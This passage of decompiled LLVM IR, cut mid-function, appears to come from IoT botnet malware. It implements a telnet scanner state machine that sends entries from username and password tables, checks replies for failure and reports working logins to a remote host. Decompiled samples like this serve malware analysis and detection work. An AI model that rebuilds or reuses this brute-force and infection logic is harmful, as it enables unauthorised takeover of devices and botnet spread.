  %v3_f27c = call i32 @__GI_memset(i8* %v2_f27c, i32 0)
  %v2_f29c = add i32 %v2_ea44, 8
  store i32 %v2_f29c, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_f2a4 = inttoptr i32 %v2_f29c to i8*
  store i8 2, i8* %v3_f2a4, align 4
  br label %dec_label_pc_ff2c

dec_label_pc_f2ac:                                ; preds = %dec_label_pc_efd4
  %v3_f2b0 = icmp eq i32 %v5_f0b0, -1
  store i32 %storemerge511, i32* %r3.global-to-local, align 4
  br i1 %v3_f2b0, label %dec_label_pc_f2b8, label %dec_label_pc_f330

dec_label_pc_f2b8:                                ; preds = %dec_label_pc_f2ac
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v2_f2d0 = load i32, i32* %v1_efec, align 4
  store i32 %v2_f2d0, i32* %r3.global-to-local, align 4
  %v3_f2d8 = call i32 @sclose(i32 %v2_f2d0, i32 %v3_e904, i32 %v3_ea38)
  %v2_f2f8 = add i32 %v2_ea44, 8
  %v3_f300 = inttoptr i32 %v2_f2f8 to i8*
  store i8 0, i8* %v3_f300, align 4
  store i32 %v2_f2f8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_f328 = add i32 %v2_ea44, 9
  %v4_f328 = inttoptr i32 %v3_f328 to i8*
  store i8 1, i8* %v4_f328, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_f330:                                ; preds = %dec_label_pc_f2ac
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea48, i32* %r3.global-to-local, align 4
  %v2_f350 = load i32, i32* %v1_ea4c, align 4
  store i32 %v2_f350, i32* %r3.global-to-local, align 4
  %v1_f354 = add i32 %v2_f350, 6
  store i32 %v1_f354, i32* @r4, align 4
  %v2_f35c = call i32 @__GI_time(i32* null)
  store i32 %v2_f35c, i32* %r3.global-to-local, align 4
  %v0_f364 = load i32, i32* @r4, align 4
  %v3_f364 = icmp ult i32 %v0_f364, %v2_f35c
  br i1 %v3_f364, label %dec_label_pc_f36c, label %dec_label_pc_ff2c

dec_label_pc_f36c:                                ; preds = %dec_label_pc_f330
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v2_f384 = load i32, i32* %v1_efec, align 4
  store i32 %v2_f384, i32* %r3.global-to-local, align 4
  %v3_f38c = call i32 @sclose(i32 %v2_f384, i32 %v3_e904, i32 %v3_ea38)
  %v2_f3ac = add i32 %v2_ea44, 8
  %v3_f3b4 = inttoptr i32 %v2_f3ac to i8*
  store i8 0, i8* %v3_f3b4, align 4
  store i32 %v2_f3ac, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_f3dc = add i32 %v2_ea44, 9
  %v4_f3dc = inttoptr i32 %v3_f3dc to i8*
  store i8 1, i8* %v4_f3dc, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_f3e4:                                ; preds = %dec_label_pc_ea90
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v1_f3fc = inttoptr i32 %v2_ea44 to i32*
  %v2_f3fc = load i32, i32* %v1_f3fc, align 4
  store i32 %v2_f3fc, i32* %ip.global-to-local, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  %v2_f41c = add i32 %v2_ea40, %v2_f264
  store i32 %v2_f41c, i32* %r3.global-to-local, align 4
  %v1_f420 = inttoptr i32 %v2_f41c to i32*
  %v2_f420 = load i32, i32* %v1_f420, align 4
  store i32 %v2_f420, i32* %r2.global-to-local, align 4
  %v1_f428 = load i32, i32* @sp, align 4
  %v2_f428 = inttoptr i32 %v1_f428 to i32*
  store i32 ptrtoint (i32* @global_var_29064 to i32), i32* %v2_f428, align 4
  %v0_f42c = load i32, i32* %ip.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v4_f43c = inttoptr i32 %v2_f420 to i8*
  %v5_f43c = call i32 @read_until_response(i32 %v0_f42c, i32 10000, i8* %v4_f43c, i32 512)
  %v2_f444 = icmp eq i32 %v5_f43c, 0
  store i32 %storemerge511, i32* %r3.global-to-local, align 4
  br i1 %v2_f444, label %dec_label_pc_f4dc, label %dec_label_pc_f44c

dec_label_pc_f44c:                                ; preds = %dec_label_pc_f3e4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  %v2_f468 = add i32 %v2_ea44, 24
  store i32 %v2_f468, i32* %r3.global-to-local, align 4
  %v1_f46c = inttoptr i32 %v2_f468 to i32*
  %v2_f46c = load i32, i32* %v1_f46c, align 4
  store i32 %v2_f46c, i32* %r3.global-to-local, align 4
  %v1_f474 = call i32 @contains_fail(i32 %v2_f46c)
  %v2_f47c = icmp eq i32 %v1_f474, 0
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v2_f4cc = add i32 %v2_ea44, 8
  store i32 %v2_f4cc, i32* %r2.global-to-local, align 4
  br i1 %v2_f47c, label %dec_label_pc_f4b0, label %dec_label_pc_f484

dec_label_pc_f484:                                ; preds = %dec_label_pc_f44c
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_f4a8 = inttoptr i32 %v2_f4cc to i8*
  store i8 0, i8* %v3_f4a8, align 4
  br label %dec_label_pc_ff2c

dec_label_pc_f4b0:                                ; preds = %dec_label_pc_f44c
  store i32 3, i32* %r3.global-to-local, align 4
  %v3_f4d4 = inttoptr i32 %v2_f4cc to i8*
  store i8 3, i8* %v3_f4d4, align 4
  br label %dec_label_pc_ff2c

dec_label_pc_f4dc:                                ; preds = %dec_label_pc_f3e4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea48, i32* %r3.global-to-local, align 4
  %v2_f4fc = load i32, i32* %v1_ea4c, align 4
  store i32 %v2_f4fc, i32* %r3.global-to-local, align 4
  %v1_f500 = add i32 %v2_f4fc, 6
  store i32 %v1_f500, i32* @r4, align 4
  %v2_f508 = call i32 @__GI_time(i32* null)
  store i32 %v2_f508, i32* %r3.global-to-local, align 4
  %v0_f510 = load i32, i32* @r4, align 4
  %v3_f510 = icmp ult i32 %v0_f510, %v2_f508
  br i1 %v3_f510, label %dec_label_pc_f518, label %dec_label_pc_ff2c

dec_label_pc_f518:                                ; preds = %dec_label_pc_f4dc
  %v2_f534 = add i32 %v2_ea44, 8
  %v3_f53c = inttoptr i32 %v2_f534 to i8*
  store i8 0, i8* %v3_f53c, align 4
  store i32 %v2_f534, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_f564 = add i32 %v2_ea44, 9
  %v4_f564 = inttoptr i32 %v3_f564 to i8*
  store i8 1, i8* %v4_f564, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_f56c:                                ; preds = %dec_label_pc_ea90
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v1_f584 = inttoptr i32 %v2_ea44 to i32*
  %v2_f584 = load i32, i32* %v1_f584, align 4
  store i32 %v2_f584, i32* @r4, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  %v2_f5a4 = add i32 %v2_ea44, 8
  store i32 %v2_f5a4, i32* %r3.global-to-local, align 4
  %v1_f5a8 = add i32 %v2_ea44, 10
  %v2_f5a8 = inttoptr i32 %v1_f5a8 to i8*
  %v3_f5a8 = load i8, i8* %v2_f5a8, align 2
  %v4_f5a8 = zext i8 %v3_f5a8 to i32
  store i32 %v4_f5a8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([295 x i8*]* @global_var_290e4.875 to i32), i32* %r3.global-to-local, align 4
  %v4_f5b4 = mul nuw nsw i32 %v4_f5a8, 4
  %v5_f5b4 = add i32 %v4_f5b4, ptrtoint ([295 x i8*]* @global_var_290e4.875 to i32)
  %v6_f5b4 = inttoptr i32 %v5_f5b4 to i32*
  %v7_f5b4 = load i32, i32* %v6_f5b4, align 4
  store i32 %v7_f5b4, i32* @r5, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_f5a4, i32* %r3.global-to-local, align 4
  %v3_f5d8 = load i8, i8* %v2_f5a8, align 2
  %v4_f5d8 = zext i8 %v3_f5d8 to i32
  store i32 %v4_f5d8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([295 x i8*]* @global_var_290e4.875 to i32), i32* %r3.global-to-local, align 4
  %v4_f5e4 = mul nuw nsw i32 %v4_f5d8, 4
  %v5_f5e4 = add i32 %v4_f5e4, ptrtoint ([295 x i8*]* @global_var_290e4.875 to i32)
  %v6_f5e4 = inttoptr i32 %v5_f5e4 to i32*
  %v7_f5e4 = load i32, i32* %v6_f5e4, align 4
  store i32 %v7_f5e4, i32* %r3.global-to-local, align 4
  %v1_f5e8 = inttoptr i32 %v7_f5e4 to i8*
  %v3_f5ec = call i32 @strlen(i8* %v1_f5e8)
  %v0_f5f4 = load i32, i32* @r4, align 4
  %v0_f5f8 = load i32, i32* @r5, align 4
  store i32 %v3_f5ec, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f604 = inttoptr i32 %v0_f5f8 to i32*
  %v5_f604 = call i32 @__libc_send(i32 %v0_f5f4, i32* %v4_f604, i32 %v3_f5ec, i32 16384)
  %v1_f60c = icmp slt i32 %v5_f604, 0
  store i32 %storemerge511, i32* %r3.global-to-local, align 4
  br i1 %v1_f60c, label %dec_label_pc_f614, label %dec_label_pc_f668

dec_label_pc_f614:                                ; preds = %dec_label_pc_f56c
  %v3_f638 = inttoptr i32 %v2_f5a4 to i8*
  store i8 0, i8* %v3_f638, align 4
  store i32 %v2_f5a4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_f660 = add i32 %v2_ea44, 9
  %v4_f660 = inttoptr i32 %v3_f660 to i8*
  store i8 1, i8* %v4_f660, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_f668:                                ; preds = %dec_label_pc_f56c
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v2_f680 = load i32, i32* %v1_f584, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_f694 = call i32 @__libc_send(i32 %v2_f680, i32* bitcast ([3 x i8]* @global_var_1f4c4.877 to i32*), i32 2, i32 16384)
  %v1_f69c = icmp slt i32 %v6_f694, 0
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  store i32 %v2_f5a4, i32* %r2.global-to-local, align 4
  br i1 %v1_f69c, label %dec_label_pc_f6a4, label %dec_label_pc_f6f8

dec_label_pc_f6a4:                                ; preds = %dec_label_pc_f668
  %v3_f6c8 = inttoptr i32 %v2_f5a4 to i8*
  store i8 0, i8* %v3_f6c8, align 4
  store i32 %v2_f5a4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_f6f0 = add i32 %v2_ea44, 9
  %v4_f6f0 = inttoptr i32 %v3_f6f0 to i8*
  store i8 1, i8* %v4_f6f0, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_f6f8:                                ; preds = %dec_label_pc_f668
  store i32 4, i32* %r3.global-to-local, align 4
  %v3_f71c = inttoptr i32 %v2_f5a4 to i8*
  store i8 4, i8* %v3_f71c, align 4
  br label %dec_label_pc_ff2c

dec_label_pc_f724:                                ; preds = %dec_label_pc_ea90
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v1_f73c = inttoptr i32 %v2_ea44 to i32*
  %v2_f73c = load i32, i32* %v1_f73c, align 4
  store i32 %v2_f73c, i32* %ip.global-to-local, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  %v2_f75c = add i32 %v2_ea40, %v2_f264
  store i32 %v2_f75c, i32* %r3.global-to-local, align 4
  %v1_f760 = inttoptr i32 %v2_f75c to i32*
  %v2_f760 = load i32, i32* %v1_f760, align 4
  store i32 %v2_f760, i32* %r2.global-to-local, align 4
  %v1_f768 = load i32, i32* @sp, align 4
  %v2_f768 = inttoptr i32 %v1_f768 to i32*
  store i32 ptrtoint (i32* @global_var_29064 to i32), i32* %v2_f768, align 4
  %v0_f76c = load i32, i32* %ip.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v4_f77c = inttoptr i32 %v2_f760 to i8*
  %v5_f77c = call i32 @read_until_response(i32 %v0_f76c, i32 10000, i8* %v4_f77c, i32 512)
  %v2_f784 = icmp eq i32 %v5_f77c, 0
  store i32 %storemerge511, i32* %r3.global-to-local, align 4
  br i1 %v2_f784, label %dec_label_pc_f81c, label %dec_label_pc_f78c

dec_label_pc_f78c:                                ; preds = %dec_label_pc_f724
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  %v2_f7a8 = add i32 %v2_ea44, 24
  store i32 %v2_f7a8, i32* %r3.global-to-local, align 4
  %v1_f7ac = inttoptr i32 %v2_f7a8 to i32*
  %v2_f7ac = load i32, i32* %v1_f7ac, align 4
  store i32 %v2_f7ac, i32* %r3.global-to-local, align 4
  %v1_f7b4 = call i32 @contains_fail(i32 %v2_f7ac)
  %v2_f7bc = icmp eq i32 %v1_f7b4, 0
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v2_f80c = add i32 %v2_ea44, 8
  store i32 %v2_f80c, i32* %r2.global-to-local, align 4
  br i1 %v2_f7bc, label %dec_label_pc_f7f0, label %dec_label_pc_f7c4

dec_label_pc_f7c4:                                ; preds = %dec_label_pc_f78c
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_f7e8 = inttoptr i32 %v2_f80c to i8*
  store i8 0, i8* %v3_f7e8, align 4
  br label %dec_label_pc_ff2c

dec_label_pc_f7f0:                                ; preds = %dec_label_pc_f78c
  store i32 5, i32* %r3.global-to-local, align 4
  %v3_f814 = inttoptr i32 %v2_f80c to i8*
  store i8 5, i8* %v3_f814, align 4
  br label %dec_label_pc_ff2c

dec_label_pc_f81c:                                ; preds = %dec_label_pc_f724
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea48, i32* %r3.global-to-local, align 4
  %v2_f83c = load i32, i32* %v1_ea4c, align 4
  store i32 %v2_f83c, i32* %r3.global-to-local, align 4
  %v1_f840 = add i32 %v2_f83c, 6
  store i32 %v1_f840, i32* @r4, align 4
  %v2_f848 = call i32 @__GI_time(i32* null)
  store i32 %v2_f848, i32* %r3.global-to-local, align 4
  %v0_f850 = load i32, i32* @r4, align 4
  %v3_f850 = icmp ult i32 %v0_f850, %v2_f848
  br i1 %v3_f850, label %dec_label_pc_f858, label %dec_label_pc_ff2c

dec_label_pc_f858:                                ; preds = %dec_label_pc_f81c
  %v2_f874 = add i32 %v2_ea44, 8
  %v3_f87c = inttoptr i32 %v2_f874 to i8*
  store i8 0, i8* %v3_f87c, align 4
  store i32 %v2_f874, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_f8a4 = add i32 %v2_ea44, 9
  %v4_f8a4 = inttoptr i32 %v3_f8a4 to i8*
  store i8 1, i8* %v4_f8a4, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_f8ac:                                ; preds = %dec_label_pc_ea90
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v1_f8c4 = inttoptr i32 %v2_ea44 to i32*
  %v2_f8c4 = load i32, i32* %v1_f8c4, align 4
  store i32 %v2_f8c4, i32* @r4, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  %v2_f8e4 = add i32 %v2_ea44, 8
  store i32 %v2_f8e4, i32* %r3.global-to-local, align 4
  %v1_f8e8 = add i32 %v2_ea44, 11
  %v2_f8e8 = inttoptr i32 %v1_f8e8 to i8*
  %v3_f8e8 = load i8, i8* %v2_f8e8, align 1
  %v4_f8e8 = zext i8 %v3_f8e8 to i32
  store i32 %v4_f8e8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([281 x i8*]* @global_var_2911c.879 to i32), i32* %r3.global-to-local, align 4
  %v4_f8f4 = mul nuw nsw i32 %v4_f8e8, 4
  %v5_f8f4 = add i32 %v4_f8f4, ptrtoint ([281 x i8*]* @global_var_2911c.879 to i32)
  %v6_f8f4 = inttoptr i32 %v5_f8f4 to i32*
  %v7_f8f4 = load i32, i32* %v6_f8f4, align 4
  store i32 %v7_f8f4, i32* @r5, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_f8e4, i32* %r3.global-to-local, align 4
  %v3_f918 = load i8, i8* %v2_f8e8, align 1
  %v4_f918 = zext i8 %v3_f918 to i32
  store i32 %v4_f918, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([281 x i8*]* @global_var_2911c.879 to i32), i32* %r3.global-to-local, align 4
  %v4_f924 = mul nuw nsw i32 %v4_f918, 4
  %v5_f924 = add i32 %v4_f924, ptrtoint ([281 x i8*]* @global_var_2911c.879 to i32)
  %v6_f924 = inttoptr i32 %v5_f924 to i32*
  %v7_f924 = load i32, i32* %v6_f924, align 4
  store i32 %v7_f924, i32* %r3.global-to-local, align 4
  %v1_f928 = inttoptr i32 %v7_f924 to i8*
  %v3_f92c = call i32 @strlen(i8* %v1_f928)
  %v0_f934 = load i32, i32* @r4, align 4
  %v0_f938 = load i32, i32* @r5, align 4
  store i32 %v3_f92c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f944 = inttoptr i32 %v0_f938 to i32*
  %v5_f944 = call i32 @__libc_send(i32 %v0_f934, i32* %v4_f944, i32 %v3_f92c, i32 16384)
  %v1_f94c = icmp slt i32 %v5_f944, 0
  store i32 %storemerge511, i32* %r3.global-to-local, align 4
  br i1 %v1_f94c, label %dec_label_pc_f954, label %dec_label_pc_f9a8

dec_label_pc_f954:                                ; preds = %dec_label_pc_f8ac
  %v3_f978 = inttoptr i32 %v2_f8e4 to i8*
  store i8 0, i8* %v3_f978, align 4
  store i32 %v2_f8e4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_f9a0 = add i32 %v2_ea44, 9
  %v4_f9a0 = inttoptr i32 %v3_f9a0 to i8*
  store i8 1, i8* %v4_f9a0, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_f9a8:                                ; preds = %dec_label_pc_f8ac
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v2_f9c0 = load i32, i32* %v1_f8c4, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_f9d4 = call i32 @__libc_send(i32 %v2_f9c0, i32* bitcast ([3 x i8]* @global_var_1f4c4.877 to i32*), i32 2, i32 16384)
  %v1_f9dc = icmp slt i32 %v6_f9d4, 0
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  store i32 %v2_f8e4, i32* %r2.global-to-local, align 4
  br i1 %v1_f9dc, label %dec_label_pc_f9e4, label %dec_label_pc_fa38

dec_label_pc_f9e4:                                ; preds = %dec_label_pc_f9a8
  %v3_fa08 = inttoptr i32 %v2_f8e4 to i8*
  store i8 0, i8* %v3_fa08, align 4
  store i32 %v2_f8e4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_fa30 = add i32 %v2_ea44, 9
  %v4_fa30 = inttoptr i32 %v3_fa30 to i8*
  store i8 1, i8* %v4_fa30, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_fa38:                                ; preds = %dec_label_pc_f9a8
  store i32 6, i32* %r3.global-to-local, align 4
  %v3_fa5c = inttoptr i32 %v2_f8e4 to i8*
  store i8 6, i8* %v3_fa5c, align 4
  br label %dec_label_pc_ff2c

dec_label_pc_fa64:                                ; preds = %dec_label_pc_ea90
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v1_fa7c = inttoptr i32 %v2_ea44 to i32*
  %v2_fa7c = load i32, i32* %v1_fa7c, align 4
  store i32 %v2_fa7c, i32* %ip.global-to-local, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  %v2_fa9c = add i32 %v2_ea40, %v2_f264
  store i32 %v2_fa9c, i32* %r3.global-to-local, align 4
  %v1_faa0 = inttoptr i32 %v2_fa9c to i32*
  %v2_faa0 = load i32, i32* %v1_faa0, align 4
  store i32 %v2_faa0, i32* %r2.global-to-local, align 4
  %v1_faa8 = load i32, i32* @sp, align 4
  %v2_faa8 = inttoptr i32 %v1_faa8 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_29078.882 to i32), i32* %v2_faa8, align 4
  %v0_faac = load i32, i32* %ip.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v4_fabc = inttoptr i32 %v2_faa0 to i8*
  %v5_fabc = call i32 @read_until_response(i32 %v0_faac, i32 10000, i8* %v4_fabc, i32 512)
  store i32 %v5_fabc, i32* %r3.global-to-local, align 4
  %v2_fac4 = icmp eq i32 %v5_fabc, 0
  br i1 %v2_fac4, label %dec_label_pc_fc38, label %dec_label_pc_facc

dec_label_pc_facc:                                ; preds = %dec_label_pc_fa64
  store i32 %storemerge511, i32* @r4, align 4
  %v2_fad4 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_fae8 = load i32, i32* @r4, align 4
  %v2_faf4 = mul i32 %v0_fae8, 28
  %v2_fafc = add i32 %v2_fc50, %v2_faf4
  %v2_fb00 = inttoptr i32 %v2_fafc to i32*
  store i32 %v2_fad4, i32* %v2_fb00, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_fa9c, i32* %r3.global-to-local, align 4
  %v2_fb24 = load i32, i32* %v1_faa0, align 4
  store i32 %v2_fb24, i32* %r3.global-to-local, align 4
  %v1_fb2c = call i32 @contains_fail(i32 %v2_fb24)
  store i32 %v1_fb2c, i32* %r3.global-to-local, align 4
  %v2_fb34 = icmp eq i32 %v1_fb2c, 0
  br i1 %v2_fb34, label %dec_label_pc_fb68, label %dec_label_pc_fb3c

dec_label_pc_fb3c:                                ; preds = %dec_label_pc_facc
  %v2_fb58 = add i32 %v2_ea44, 8
  store i32 %v2_fb58, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_fb60 = inttoptr i32 %v2_fb58 to i8*
  store i8 0, i8* %v3_fb60, align 4
  br label %dec_label_pc_ff2c

dec_label_pc_fb68:                                ; preds = %dec_label_pc_facc
  %v2_fb6c = load i32, i32* @global_var_29910.71, align 4
  store i32 %v2_fb6c, i32* @r4, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v3_fb8c = call i32 @get_telstate_host(i32 %v2_ea44, i32 %v3_e904, i32 %v3_ea38)
  store i32 %v3_fb8c, i32* %ip.global-to-local, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  %v2_fbb0 = add i32 %v2_ea44, 8
  store i32 %v2_fbb0, i32* %r3.global-to-local, align 4
  %v1_fbb4 = add i32 %v2_ea44, 10
  %v2_fbb4 = inttoptr i32 %v1_fbb4 to i8*
  %v3_fbb4 = load i8, i8* %v2_fbb4, align 2
  %v4_fbb4 = zext i8 %v3_fbb4 to i32
  store i32 %v4_fbb4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([295 x i8*]* @global_var_290e4.875 to i32), i32* %r3.global-to-local, align 4
  %v4_fbc0 = mul nuw nsw i32 %v4_fbb4, 4
  %v5_fbc0 = add i32 %v4_fbc0, ptrtoint ([295 x i8*]* @global_var_290e4.875 to i32)
  %v6_fbc0 = inttoptr i32 %v5_fbc0 to i32*
  %v7_fbc0 = load i32, i32* %v6_fbc0, align 4
  store i32 %v7_fbc0, i32* @lr, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_fbb0, i32* %r3.global-to-local, align 4
  %v1_fbe4 = add i32 %v2_ea44, 11
  %v2_fbe4 = inttoptr i32 %v1_fbe4 to i8*
  %v3_fbe4 = load i8, i8* %v2_fbe4, align 1
  %v4_fbe4 = zext i8 %v3_fbe4 to i32
  store i32 %v4_fbe4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([281 x i8*]* @global_var_2911c.879 to i32), i32* %r3.global-to-local, align 4
  %v4_fbf0 = mul nuw nsw i32 %v4_fbe4, 4
  %v5_fbf0 = add i32 %v4_fbf0, ptrtoint ([281 x i8*]* @global_var_2911c.879 to i32)
  %v6_fbf0 = inttoptr i32 %v5_fbf0 to i32*
  %v7_fbf0 = load i32, i32* %v6_fbf0, align 4
  %v1_fbf4 = load i32, i32* @sp, align 4
  %v2_fbf4 = inttoptr i32 %v1_fbf4 to i32*
  store i32 %v7_fbf0, i32* %v2_fbf4, align 4
  %v0_fbf8 = load i32, i32* @r4, align 4
  %v0_fc00 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_fc00, i32* @r2, align 4
  %v0_fc04 = load i32, i32* @lr, align 4
  store i32 %v0_fc04, i32* %r3.global-to-local, align 4
  %v2_fc08 = call i32 @sockprintf(i32 %v0_fbf8, i32 ptrtoint (i32* @global_var_1f4c8.885 to i32))
  store i32 %v2_fbb0, i32* %r2.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v3_fc30 = inttoptr i32 %v2_fbb0 to i8*
  store i8 7, i8* %v3_fc30, align 4
  br label %dec_label_pc_ff2c

dec_label_pc_fc38:                                ; preds = %dec_label_pc_fa64
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  %v2_fc54 = add i32 %v2_ea40, %v2_fc50
  store i32 %v2_fc54, i32* %r3.global-to-local, align 4
  %v1_fc58 = inttoptr i32 %v2_fc54 to i32*
  %v2_fc58 = load i32, i32* %v1_fc58, align 4
  store i32 %v2_fc58, i32* %r3.global-to-local, align 4
  %v1_fc5c = add i32 %v2_fc58, 7
  store i32 %v1_fc5c, i32* @r4, align 4
  %v2_fc64 = call i32 @__GI_time(i32* null)
  store i32 %v2_fc64, i32* %r3.global-to-local, align 4
  %v0_fc6c = load i32, i32* @r4, align 4
  %v3_fc6c = icmp ult i32 %v0_fc6c, %v2_fc64
  br i1 %v3_fc6c, label %dec_label_pc_fc74, label %dec_label_pc_ff2c

dec_label_pc_fc74:                                ; preds = %dec_label_pc_fc38
  %v2_fc90 = add i32 %v2_ea44, 8
  %v3_fc98 = inttoptr i32 %v2_fc90 to i8*
  store i8 0, i8* %v3_fc98, align 4
  store i32 %v2_fc90, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_fcc0 = add i32 %v2_ea44, 9
  %v4_fcc0 = inttoptr i32 %v3_fcc0 to i8*
  store i8 1, i8* %v4_fcc0, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_fcc8:                                ; preds = %dec_label_pc_ea90
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v1_fce0 = inttoptr i32 %v2_ea44 to i32*
  %v2_fce0 = load i32, i32* %v1_fce0, align 4
  store i32 425, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_fcf8 = call i32 @__libc_send(i32 %v2_fce0, i32* bitcast ([447 x i8]* @global_var_1f508.887 to i32*), i32 425, i32 16384)
  %v1_fd00 = icmp slt i32 %v6_fcf8, 0
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v2_fd24 = add i32 %v2_ea44, 8
  store i32 %v2_fd24, i32* %r2.global-to-local, align 4
  br i1 %v1_fd00, label %dec_label_pc_fd08, label %dec_label_pc_fd5c

dec_label_pc_fd08:                                ; preds = %dec_label_pc_fcc8
  %v3_fd2c = inttoptr i32 %v2_fd24 to i8*
  store i8 0, i8* %v3_fd2c, align 4
  store i32 %v2_fd24, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_fd54 = add i32 %v2_ea44, 9
  %v4_fd54 = inttoptr i32 %v3_fd54 to i8*
  store i8 1, i8* %v4_fd54, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_fd5c:                                ; preds = %dec_label_pc_fcc8
  store i32 8, i32* %r3.global-to-local, align 4
  %v3_fd80 = inttoptr i32 %v2_fd24 to i8*
  store i8 8, i8* %v3_fd80, align 4
  br label %dec_label_pc_ff2c

dec_label_pc_fd88:                                ; preds = %dec_label_pc_ea90
  store i32 %storemerge511, i32* @r4, align 4
  %v2_fd90 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_fda4 = load i32, i32* @r4, align 4
  %v2_fdb0 = mul i32 %v0_fda4, 28
  %v2_fdb8 = add i32 %v2_fc50, %v2_fdb0
  %v2_fdbc = inttoptr i32 %v2_fdb8 to i32*
  store i32 %v2_fd90, i32* %v2_fdbc, align 4
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v1_fdd8 = inttoptr i32 %v2_ea44 to i32*
  %v2_fdd8 = load i32, i32* %v1_fdd8, align 4
  store i32 425, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
